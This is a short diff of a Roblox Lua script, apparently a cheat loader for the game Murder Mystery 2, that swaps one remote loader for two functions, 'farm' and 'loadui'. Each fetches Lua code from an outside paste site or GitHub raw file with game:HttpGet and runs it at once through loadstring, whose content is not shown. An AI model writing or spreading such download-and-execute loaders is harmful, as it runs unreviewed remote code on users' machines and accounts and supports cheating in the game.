@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://pastefy.app/HivLoe0J/raw"))()
+local function farm()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/mjyuq6Jkgl/0", true))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua'))()
+end
+
+task.spawn(farm)
+task.spawn(loadui)
